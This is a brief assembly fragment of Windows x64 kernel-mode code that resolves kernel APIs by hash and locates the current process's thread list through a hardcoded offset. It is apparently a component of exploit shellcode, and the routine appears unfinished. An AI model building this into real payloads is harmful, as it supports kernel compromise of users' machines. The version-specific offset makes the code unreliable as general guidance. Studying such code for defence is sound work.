;
; Windows x64 Kernel Get User Thread
;
; Author: Sean Dillon <sean.dillon@risksense.com> (@zerosum0x0)
; Copyright: (c) 2017 RiskSense, Inc.
; License: Apache 2.0
;
; Arguments: r15 = base of nt
; Clobbers: RAX, RSI
; Return:
;

THREADLISTHEAD_OFFSET     equ   0x308


find_thread:

  mov rax, r15
  mov r11d, PSGETCURRENTPROCESS_HASH
  call block_api_direct

  add rax, THREADLISTHEAD_OFFSET          ; PEPROCESS->ThreadListHead
  mov rsi, rax

  mov rax, r15
  mov r11d, KEGETCURRENTTHREAD_HASH
  call block_api_direct
